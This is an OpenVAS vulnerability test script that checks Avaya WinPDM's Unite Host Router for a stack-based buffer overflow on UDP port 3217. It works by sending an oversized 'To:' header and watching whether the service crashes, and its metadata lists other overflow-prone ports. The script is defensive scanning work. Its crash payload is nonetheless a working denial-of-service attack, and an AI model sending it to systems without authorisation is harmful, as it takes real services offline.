###############################################################################
# OpenVAS Vulnerability Test
#
# Avaya WinPDM Multiple Buffer Overflow Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802469");
  script_version("2019-04-29T07:32:42+0000");
  script_bugtraq_id(47947);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"2019-04-29 07:32:42 +0000 (Mon, 29 Apr 2019)");
  script_tag(name:"creation_date", value:"2012-10-12 12:33:59 +0530 (Fri, 12 Oct 2012)");
  script_name("Avaya WinPDM Multiple Buffer Overflow Vulnerabilities");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_udp_ports(3217);
  script_dependencies("find_service.nasl");

  script_xref(name:"URL", value:"http://secunia.com/advisories/44062/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18397/");
  script_xref(name:"URL", value:"https://downloads.avaya.com/css/P8/documents/100140122");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/117209/Avaya-WinPMD-UniteHostRouter-Buffer-Overflow.html");

  script_tag(name:"impact", value:"Successful exploitation will allow unauthenticated attackers to cause the
  application to crash.");

  script_tag(name:"affected", value:"Avaya WinPDM version 3.8.2 and prior.");

  script_tag(name:"insight", value:"Multiple flaws are due to a boundary error in,

  - Unite Host Router service (UniteHostRouter.exe) when processing certain
    requests can be exploited to cause a stack-based buffer overflow via
    long string to the 'To:' field sent to UDP port 3217.

  - UspCsi.exe when processing certain crafted overly long string requests
    can be exploited to cause a heap-based buffer overflow via a specially
    crafted overly long string sent to UDP port 10136.

  - CuspSerialCsi.exe when processing certain crafted overly long string
    requests can be exploited to cause a heap-based buffer overflow via a
    specially crafted overly long string sent to UDP port 10158.

  - MwpCsi.exe when processing certain crafted overly long string requests
    can be exploited to cause a heap-based buffer overflow via a specially
    crafted overly long string sent to UDP port 10137.

  - PMServer.exe when processing certain requests can be exploited to cause
    a heap-based buffer overflow via a specially crafted overly long string
    sent to UDP port 10138.");

  script_tag(name:"solution", value:"Upgrade to Avaya WinPDM 3.8.5 or later.");

  script_tag(name:"summary", value:"The host is running Avaya WinPDM and is prone to multiple buffer overflow vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

port = 3217;

if(!get_udp_port_state(port)){
  exit(0);
}

soc = open_sock_udp(port);
if(!soc){
  exit(0);
}

req = '\x55\x54\x50\x2f\x31' + ## UTP Protocol
      ' To: 127.0.0.1' +       ## To header
      ' /';

send(socket:soc, data:req + '\r\n\r\n');
resp = recv(socket:soc, length:1024);

if(resp && "503 Destination service not found" >< resp)
{
  data = req + crap(data: "A", length: 265) + '\r\n\r\n';

  send(socket:soc, data:data);

  close(soc);

  soc = open_sock_udp(port);
  if(soc)
  {
    send(socket:soc, data:req + '\r\n\r\n');

    resp = recv(socket:soc, length:1024);

    if(!resp && "503 Destination service not found" >!< resp){
      security_message(port:port);
    }
    close(soc);
  }
  else{
    security_message(port:port);
  }
}

if(soc)
  close(soc);

exit(0);